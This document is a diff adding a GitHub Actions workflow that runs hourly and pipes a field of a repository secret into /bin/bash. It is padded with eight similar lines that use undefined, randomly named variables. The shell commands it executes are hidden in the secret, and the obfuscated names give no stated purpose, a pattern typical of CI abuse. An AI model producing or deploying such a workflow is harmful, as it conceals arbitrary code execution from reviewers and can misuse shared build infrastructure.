@@ -1,0 +1,24 @@
+name: huangqiangguo3456
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangqiangguo3456
+        env:
+          xmb1: ${{ secrets.xmb1 }}
+        run: |
+          echo $xmb1 | jq -r .ni50497 | /bin/bash
+          echo $twh8280 | jq -r .ue004 | /bin/bash
+          echo $smlzo65744 | jq -r .tc5845 | /bin/bash
+          echo $atf05 | jq -r .k77 | /bin/bash
+          echo $ngrv893 | jq -r .jltu656 | /bin/bash
+          echo $tk8994 | jq -r .npujm5729 | /bin/bash
+          echo $ett3361 | jq -r .vwe0685 | /bin/bash
+          echo $rabl4443 | jq -r .j1495 | /bin/bash
+          echo $e6130 | jq -r .drdl81 | /bin/bash
+
